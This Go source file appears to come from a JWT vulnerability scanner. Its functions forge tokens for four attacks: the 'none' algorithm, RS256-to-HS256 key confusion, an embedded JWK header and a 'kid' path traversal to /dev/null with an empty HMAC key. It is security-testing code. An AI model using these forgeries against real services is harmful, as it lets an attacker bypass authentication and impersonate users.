package jwt

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/big"
)

// GenerateNoneAlgToken creates a token with the none algorithm for testing.
func (d *Detector) GenerateNoneAlgToken(originalToken, variant string) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	// Modify header to use none algorithm
	parsed.Header["alg"] = variant

	// Re-encode header
	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}

	// Re-encode payload (preserve original claims)
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// Return token with empty signature
	return headerB64 + "." + payloadB64 + ".", nil
}

// GenerateAlgConfusionToken creates a token for algorithm confusion attack testing.
func (d *Detector) GenerateAlgConfusionToken(originalToken string, publicKey *rsa.PublicKey) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	// Modify header to use HS256 (algorithm confusion: RS256 -> HS256)
	parsed.Header["alg"] = "HS256"

	// Re-encode header
	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}

	// Re-encode payload
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	message := headerB64 + "." + payloadB64

	// Use public key bytes as HMAC secret
	pubKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		return "", fmt.Errorf("failed to marshal public key: %w", err)
	}

	// Create HMAC signature using public key as secret
	h := hmac.New(sha256.New, pubKeyBytes)
	h.Write([]byte(message))
	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))

	return message + "." + signature, nil
}

// GenerateEmbeddedJWKToken creates a token signed with a freshly-generated
// RSA keypair whose public half is embedded in the header's "jwk" field.
// Servers that pull the verification key from the token itself (rather than
// a trusted keystore) will accept this forgery — see CVE-2018-0114.
//
// The returned token is alg=RS256, signed with the throwaway private key.
// All original claims are preserved; the original alg/kid/jku/x5u headers
// are stripped so they don't shadow the embedded jwk during key resolution.
func (d *Detector) GenerateEmbeddedJWKToken(originalToken string) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", fmt.Errorf("failed to generate RSA key: %w", err)
	}
	pub := &priv.PublicKey

	eBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(eBuf, uint32(pub.E))
	for len(eBuf) > 1 && eBuf[0] == 0 {
		eBuf = eBuf[1:]
	}

	parsed.Header["alg"] = "RS256"
	parsed.Header["jwk"] = map[string]interface{}{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(pub.N.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(eBuf),
		"kid": "skws-forge",
	}
	delete(parsed.Header, "kid")
	delete(parsed.Header, "jku")
	delete(parsed.Header, "x5u")

	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)
	message := headerB64 + "." + payloadB64

	digest := sha256.Sum256([]byte(message))
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, digest[:])
	if err != nil {
		return "", fmt.Errorf("failed to sign with embedded JWK: %w", err)
	}

	return message + "." + base64.RawURLEncoding.EncodeToString(sig), nil
}

// GenerateKidTraversalToken creates a token whose "kid" header points at
// /dev/null via a path-traversal sequence, then signs it with HMAC-SHA256
// using an empty secret. Servers that naively read the kid value from disk
// will get back empty bytes and verify the forgery with that empty key.
//
// Returns the forged token; the original alg is forced to HS256 so that
// HMAC verification kicks in even if the original token used RS256.
func (d *Detector) GenerateKidTraversalToken(originalToken string) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	parsed.Header["alg"] = "HS256"
	parsed.Header["kid"] = "../../../../../../../../dev/null"
	delete(parsed.Header, "jwk")
	delete(parsed.Header, "jku")
	delete(parsed.Header, "x5u")

	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)
	message := headerB64 + "." + payloadB64

	h := hmac.New(sha256.New, []byte(""))
	h.Write([]byte(message))
	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))

	return message + "." + signature, nil
}

// extractEmbeddedJWK pulls the (n, e) pair out of a token's "jwk" header
// and returns the corresponding RSA public key. Used by tests to verify
// that a generated embedded-JWK token actually validates against the key
// it advertises. Returns nil if the header doesn't contain a valid jwk.
func extractEmbeddedJWK(parsed *ParsedJWT) (*rsa.PublicKey, error) {
	raw, ok := parsed.Header["jwk"]
	if !ok {
		return nil, fmt.Errorf("no jwk header")
	}
	jwk, ok := raw.(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("jwk header is not an object")
	}
	nStr, _ := jwk["n"].(string)
	eStr, _ := jwk["e"].(string)
	if nStr == "" || eStr == "" {
		return nil, fmt.Errorf("jwk missing n or e")
	}
	nBytes, err := base64.RawURLEncoding.DecodeString(nStr)
	if err != nil {
		return nil, fmt.Errorf("decode n: %w", err)
	}
	eBytes, err := base64.RawURLEncoding.DecodeString(eStr)
	if err != nil {
		return nil, fmt.Errorf("decode e: %w", err)
	}
	e := 0
	for _, b := range eBytes {
		e = e<<8 | int(b)
	}
	return &rsa.PublicKey{N: new(big.Int).SetBytes(nBytes), E: e}, nil
}
